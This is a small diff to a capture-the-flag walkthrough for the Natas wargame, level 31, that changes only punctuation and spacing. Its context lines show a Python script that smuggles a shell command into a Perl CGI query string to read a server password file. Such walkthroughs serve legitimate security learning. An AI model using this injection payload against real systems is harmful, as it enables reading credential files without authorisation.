@@ -1029,7 +1029,7 @@ The password for the next level can be found in the content.
 
 1. Log in using the username `natas31` and the password from Level 30.
 
-2. Sample script
+2. Sample script:
 
 ```
 import requests
@@ -1045,6 +1045,7 @@ response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas32 | xargs
 print(response.text)
 ```
 The password for the next level can be found in the content.
+
 
 
 
